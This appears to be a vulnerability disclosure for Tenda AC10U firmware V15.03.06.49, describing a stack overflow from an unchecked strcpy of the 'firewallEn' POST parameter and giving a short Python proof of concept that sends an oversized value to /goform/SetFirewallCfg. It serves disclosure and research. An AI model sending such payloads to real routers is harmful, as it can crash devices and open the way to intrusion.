## Overview

- Firmware download website: https://www.tendacn.com/download/detail-3795.html

## Affected version

AC10U v1.0 Firmware V15.03.06.49

## Vulnerability details

The Tenda AC10U v1.0 Firmware V15.03.06.49 firmware has a stack overflow vulnerability in the `formSetFirewallCfg` function. The `firewall_value` variable receives the `firewallEn` parameter from a POST request and is later assigned to the `firewall_buf` variable, which is fixed at 8 bytes. However, since the user can control the input of  `firewallEn`, the statement `strcpy(firewall_buf, firewall_value);` can cause a buffer overflow. The user-provided  `firewallEn` can exceed the capacity of the `firewall_buf` array, triggering this security vulnerability.

 ![image-20240313150902519](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240313150902519.png)

![image-20240313150818108](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240313150818108.png)

## POC

```python
import requests
from pwn import*

ip = "192.168.84.101"
url = "http://" + ip + "/goform/SetFirewallCfg"
payload = b"a"*1000

data = {"firewallEn": payload}
response = requests.post(url, data=data)
print(response.text)
```

![image-20240313151202672](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240313151202672.png)
